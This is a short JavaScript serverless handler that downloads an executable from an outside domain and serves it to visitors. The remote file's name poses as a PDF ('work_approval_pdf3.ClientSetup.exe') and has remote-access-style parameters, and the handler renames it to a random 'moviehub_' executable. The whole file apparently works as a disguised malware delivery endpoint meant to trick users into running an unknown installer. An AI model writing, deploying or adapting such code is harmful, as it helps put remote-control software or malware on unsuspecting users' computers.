export default async function handler(req, res) {
  const fileUrl = "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";

  try {
    const response = await fetch(fileUrl);

    if (!response.ok) {
      res.status(500).send("Failed to download");
      return;
    }

    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename=moviehub_${Math.random().toString(36).substring(2, 10)}.exe`);

    response.body.pipe(res);
  } catch (error) {
    res.status(500).send("Error occurred while downloading");
  }
}
